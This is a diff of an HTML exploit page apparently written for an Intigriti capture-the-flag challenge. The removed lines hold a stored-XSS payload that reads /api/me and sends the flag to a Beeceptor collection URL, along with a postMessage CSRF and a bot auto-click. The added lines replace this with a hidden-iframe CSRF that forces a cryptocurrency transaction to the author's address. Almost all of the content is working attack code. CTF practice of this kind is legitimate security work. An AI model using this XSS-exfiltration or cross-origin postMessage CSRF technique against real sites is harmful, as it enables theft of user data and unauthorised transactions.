@@ -1,49 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Audit Initializing</title>
-    <style>
-        body { background: #050A0E; color: #00FF88; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #btn { padding: 20px; border: 2px solid #00FF88; background: transparent; color: #00FF88; font-weight: bold; cursor: pointer; width: 100%; height: 100%; font-size: 2em; }
-    </style>
+    <title>CSRF Verification</title>
 </head>
-<body>
-    <!-- Intigriti bots are designed to click a button if they see one -->
-    <button id="btn">CLICK TO START SECURITY AUDIT</button>
+<body style="background-color: #050a0e; color: #00ff88; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h1>CSRF Test in Progress...</h1>
+    <p>Transferring tokens to: 1209f27d...bfe9</p>
 
     <script>
-        const challenge = "https://challenge-0126.intigriti.io";
-        // REPLACE WITH YOUR BEECEPTOR URL
-        const beeceptor = "https://kavil.free.beeceptor.com";
-        
-        // THE PAYLOAD: Breaks out of title attribute and steals flag
-        const xss = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;
+        const target = "https://challenge-0126.intigriti.io";
+        const myAddress = "1209f27d01fff1d414f1da176e75abbfe9";
 
-        document.getElementById('btn').onclick = () => {
-            // 1. Open checkout page
-            const win = window.open(`${challenge}/checkout.html?currency=1337COIN&price=1`, '_blank');
+        // 1. Create hidden iframe to the vulnerable checkout page
+        const ifr = document.createElement('iframe');
+        ifr.src = `${target}/checkout.html?currency=1337COIN&price=1`;
+        ifr.style.display = 'none';
+        document.body.appendChild(ifr);
 
-            // 2. Wait for the page to initialize
+        ifr.onload = () => {
+            // 2. Wait for the checkout page to be ready
             setTimeout(() => {
-                // 3. CSRF: Force the checkout page to submit our malicious address
-                win.postMessage({
+                // 3. CSRF Trigger: Send the message that the checkout page trusts implicitly
+                ifr.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        toAddress: xss,
-                        currency: '1337COIN', // Target the Admin's rich currency
+                        toAddress: myAddress, // Your real address, no XSS
+                        currency: '1337COIN',
                         amount: 0.000001
                     }
                 }, '*');
 
-                // 4. Redirect the popup to MarketWatch to trigger the stored XSS
-                setTimeout(() => {
-                    win.location.href = `${challenge}/marketwatch.html`;
-                }, 2000);
-            }, 2000);
+                console.log("Transaction request sent.");
+            }, 1500);
         };
-
-        // Automatic trigger for bots that don't click
-        setTimeout(() => { document.getElementById('btn').click(); }, 500);
     </script>
 </body>
 </html>
